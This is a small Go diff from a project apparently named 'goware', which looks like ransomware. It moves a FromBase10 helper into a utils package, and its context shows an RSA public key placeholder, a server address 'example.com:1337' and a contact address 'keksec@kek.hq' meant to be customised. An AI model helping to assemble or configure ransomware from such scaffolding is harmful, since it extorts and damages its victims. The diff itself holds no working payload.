@@ -9,10 +9,10 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"goware/utils"
 	"io"
 	"io/ioutil"
 	"log"
-	"math/big"
 	"net/http"
 	"net/url"
 	"os"
@@ -27,11 +27,9 @@ var Key rsa.PublicKey
 var server string = "example.com:1337" // server address
 var contact string = "keksec@kek.hq"   // whatever address suits you
 
-
-
 func init() {
 	Key = rsa.PublicKey{
-		N: FromBase10(""), // modify this
+		N: utils.FromBase10(""), // modify this
 		E: 65537,
 	}
 }
